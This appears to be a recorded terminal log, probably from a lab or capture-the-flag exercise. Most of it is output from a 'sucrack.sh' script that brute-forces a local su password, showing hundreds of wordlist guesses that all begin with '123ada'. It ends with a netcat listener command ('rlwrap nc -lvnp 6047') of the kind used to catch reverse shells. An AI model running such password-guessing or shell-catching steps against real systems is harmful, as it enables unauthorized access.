+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahotstuff
+Trying password: 123adacarter
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adastacey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababylove[KTrying password: 123adababylove[KTrying password: 123adababylove
+Trying password: 123adaangelina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamiller
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adascorpion
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasierra
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaplaygirl
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasweet16
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada012345
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarocker
+Trying password: 123adabhebhe
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagustavo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamarcos
+[KTrying password: 123adachance
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada123qwe
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakayla
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajames1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafootball1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaeagles
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloveme1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamilagros
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adastella
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalilmama
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabeyonce
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalovely1
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarocky
+Trying password: 123adadaddy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacatdog
+[KTrying password: 123adaarmando
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamargarita
+Trying password: 123ada151515
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloves
+./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalolita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada202020
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagerard
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaundertaker
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamistad
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawilliams
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaqwerty1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafreddy
+[KTrying password: 123adacapricorn
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacaitlin
+Trying password: 123adabryan
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadelfin
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadance
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacheerleader
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapassword2
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaPASSWORD
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adamartha
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalizzie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adageorgia
+Trying password: 123adamatthew1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaenrique
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adazxcvbn
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabadgirl
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaandrew1
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada141414
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada11111111
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadancing
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacuteme
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabooger
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaamelia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adavampire
+Trying password: 123adaskyline
+[KTrying password: 123adachiquita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaangeles
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adascoobydoo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajanine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatamara
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacarlitos
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamoney1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasheila
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajustme
+[KTrying password: 123adaireland
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakittycat
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahotdog
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adayamaha
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatristan
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaharvey
+[KTrying password: 123adaisrael
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalegolas
+Trying password: 123adamichelle1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamaddie
+[KTrying password: 123adaangie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacinderella
+Trying password: 123adajesuschrist
+Trying password: 123adalester
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaashton
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailovejesus
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatazmania
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaremember
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaxxxxxx[KTrying password: 123adaxxxxxx[KTrying password: 123adaxxxxxx
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatekiero
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adathebest
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaprincesita
+[KTrying password: 123adalucky7
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajesucristo
+Trying password: 123adapeewee
+Trying password: 123adapaloma
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabuddy1
+[KTrying password: 123adadeedee
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamiriam
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaapril
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapatches
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaregina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajanice
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacowboys
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamyself
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalipgloss
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajazmin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adarosita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahappy1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adafelipe
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachichi
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapangit
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamierda
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagenius
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada741852963
+Trying password: 123adahernandez
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaawesome
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawalter
+[KTrying password: 123adatinker
+Trying password: 123adaarturo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasilvia
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamelvin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaceleste
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapussycat
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagorgeous
+[KTrying password: 123adadavid1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamolly
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahoneyko
+Trying password: 123adamylife
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaanimal
+[KTrying password: 123adapenguin
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adababyboo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaloveu
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasimpsons
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalupita
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaboomer
+[KTrying password: 123adapanthers
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahollywood
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaalfredo
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamusica
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123adajohnson
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adailovegod
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahawaii
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasparkle
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adakristina
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasexymama
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacrazy
+Trying password: 123adavalerie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaspencer
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adascarface
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahardcore
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[KTrying password: 123ada098765
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada00000000
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawinter
+Trying password: 123adahailey
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adatrixie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adahayden
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamicheal
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adawesley
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada242424
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123ada0987654321
+[K./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamarisol
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adanikita
+Trying password: 123adadaisy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adajeremiah
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adapineapple
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamhine
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaisaiah
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachristmas
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adacesar
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adalolipop
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adabutterfly1
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adachloe
+[K[K[K[?2004h[K[?2004lTrying password: 123adalawrence
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adaxbox360
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adasheena
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamurphy
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adamadalina
+Trying password: 123adaanamaria
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adagateway
+./sucrack.sh: line 31: echo: write error: Broken pipe
+Trying password: 123adadebbie
+./sucrack.sh: line 31: echo: write error: Broken pipe
+[K[?2004h[K[K[K[K[K[K[K[K[K[?2004l
+[K[?2004h[?2004l
+Script done on 2025-02-21 10:43:01+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-02-21 10:43:19+03:00 [COMMAND="rlwrap nc -lvnp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[K
+[?2004l
+Script done on 2025-02-21 10:43:20+03:00 [COMMAND_EXIT_CODE="1"]
